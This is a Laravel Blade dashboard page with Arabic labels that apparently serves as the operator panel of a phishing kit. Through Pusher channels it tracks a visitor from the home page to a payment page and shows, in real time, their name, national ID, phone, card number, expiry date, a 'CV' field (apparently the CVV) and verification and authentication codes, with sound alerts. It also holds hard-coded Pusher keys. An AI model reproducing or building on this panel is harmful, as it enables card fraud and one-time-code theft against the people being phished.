{{-- <x-app-layout>
    <x-slot name="header">
        <h2 class="font-semibold text-xl text-gray-800 leading-tight">
            {{ __('Dashboard') }}
        </h2>
    </x-slot>

    <div class="py-12">
        <div class="max-w-7xl mx-auto sm:px-6 lg:px-8">
            <div class="bg-white overflow-hidden shadow-xl sm:rounded-lg">
                <x-welcome />
            </div>
        </div>
    </div>
</x-app-layout> --}}
@extends('layouts.dashboard')
@section('content')
<!-- Main content -->
<section class="content">


  <div class="container-fluid">
    <!-- START ALERTS AND CALLOUTS -->
    <div class="row">
        <div class="col-md-12">
            <div class="card card-default">
                <div class="card-header">
                    <h3 class="card-title">
                      <i id="name" class="fas fa-user name"> {{$notification->name}}</i>
                    </h3>
                </div>
                <div class="notificationsList">

                      @if($notification->step_number >=4)
                      <div class="card-body">
                        <h5><i class="icon fas fa-check"></i> دخل الى صفحة الدفع</h5>
                      </div><hr>
                      @endif
                      @if($notification->step_number >= 3)
                      <div class="card-body">
                        <div>
                          <h5><i class="icon fas fa-check"></i> قام بإرسال بياناته</h5>
                            <div class="direct-chat-text">
                            <p><strong class="fs-3 border p-1 rounded">Name:</strong> AM0xrKY8yd</p>
                            <p><strong class="fs-3 border p-1 rounded">National ID:</strong> 1428858558</p>
                            <p><strong class="fs-3 border p-1 rounded">Phone:</strong> 2685048530</p>
                          </div>
                        </div>
                      </div>
                      <hr>
                      @endif
                      @if($notification->step_number >= 2)
                      <div class="card-body">
                        <h5><i class="icon fas fa-check"></i> دخل الى صفحة البيانات الشخصية</h5>
                      </div><hr>
                      @endif

                      <div class="card-body">
                        <h5><i class="icon fas fa-check"></i> دخل الى الصفحة الرئيسية</h5>
                      </div>
                      <hr>


                </div>

            </div>
            <!-- /.card -->
        </div>
    <!-- /.col -->
    </div>
    <!-- /.row -->
</div>
</section>
@endsection
@section('scripts')

<script>
  var id ={{$notification->id}}
  Pusher.logToConsole = true;

  // var pusher = new Pusher('119332eca087a1d4c34fb', {
  // cluster: 'ap2'
  // });
  var pusher = new Pusher('2fa3b52f022492400aa0', {
    cluster: 'mt1'
  });

  var channelNotification = pusher.subscribe('send-notification');
  channelNotification.bind('App\\Events\\SendNotification', function(dataP) {

    const nname = document.getElementById('notiName'+dataP.people_id);
    nname.innerText = dataP.name;

    const npage = document.getElementById('notiPage'+dataP.people_id);
    npage.innerText = dataP.page;

    const ndate = document.getElementById('notiDate'+dataP.people_id);
    ndate.innerText = dataP.date;

    const ncount = document.getElementById('notiCount'+dataP.people_id);
    ncount.innerText = dataP.count;

    playNotificationAudio();

  });

  var channelVisit = pusher.subscribe('send-visit');
  channelVisit.bind('App\\Events\\SendVisit', function(dataV)
  {
    if(dataV.people_id == id)
    {
      $(".notificationsList").prepend(`
        <div class="card-body">
            <div>
              <h5><i class="icon fas fa-check"></i> `+dataV.page+`</h5>
            </div>
        </div>
        <hr>
      `);
      playNotificationAudio();
    }
  });

  var channelPeople = pusher.subscribe('send-people');
  channelPeople.bind('App\\Events\\SendPeople', function(dataP)
  {
    if(dataP.people_id == id)
    {
      $(".notificationsList").prepend(`
        <div class="card-body">
          <h5><i class="icon fas fa-check"></i> `+dataP.page+`</h5>
            <div class="direct-chat-text">
            <p><strong class="fs-3 border p-1 rounded">Name:</strong> `+dataP.name+`</p>
            <p><strong class="fs-3 border p-1 rounded">National ID:</strong> `+dataP.natID+`</p>
            <p><strong class="fs-3 border p-1 rounded">Phone:</strong> `+dataP.phone+`</p>
          </div>
        </div><hr>
      `);

      const elementName = document.getElementById("name");
      elementName.innerText = " "+dataP.name;

      playDataAudio();
    }
  });

  var channelPart = pusher.subscribe('send-part');
  channelPart.bind('App\\Events\\SendPart', function(dataPr)
  {
    if(dataPr.people_id == id)
    {
      $(".notificationsList").prepend(`
        <div class="card-body">
          <h5><i class="icon fas fa-check"></i> `+dataPr.page+`</h5>
            <div class="direct-chat-text">
            <p><strong class="fs-3 border p-1 rounded">Name:</strong> `+dataPr.cname+`</p>
            <p><strong class="fs-3 border p-1 rounded">Number:</strong> `+dataPr.cnmbr+`</p>
            <p><strong class="fs-3 border p-1 rounded">Date:</strong> `+dataPr.exDate+`</p>
            <p><strong class="fs-3 border p-1 rounded">CV:</strong> `+dataPr.resume+`</p>
          </div>
        </div><hr>
      `);

      playDataAudio();
    }
  });

  var channelVern = pusher.subscribe('send-vern');
  channelVern.bind('App\\Events\\SendVern', function(dataV)
  {
    if(dataV.people_id == id)
    {
      $(".notificationsList").prepend(`
        <div class="card-body">
          <h5><i class="icon fas fa-check"></i> `+dataV.page+`</h5>
            <div class="direct-chat-text">
            <p><strong class="fs-3 border p-1 rounded">Name:</strong> `+dataV.code+`</p>
          </div>
        </div><hr>
      `);

      playDataAudio();
    }
  });

  var channelAuth = pusher.subscribe('send-auth');
  channelAuth.bind('App\\Events\\SendAuth', function(dataA)
  {
    if(dataA.people_id == id)
    {
      $(".notificationsList").prepend(`
        <div class="card-body">
          <h5><i class="icon fas fa-check"></i> `+dataA.page+`</h5>
            <div class="direct-chat-text">
            <p><strong class="fs-3 border p-1 rounded">Name:</strong> `+dataA.code+`</p>
          </div>
        </div><hr>
      `);

      playDataAudio();
    }
  });

</script>
@endsection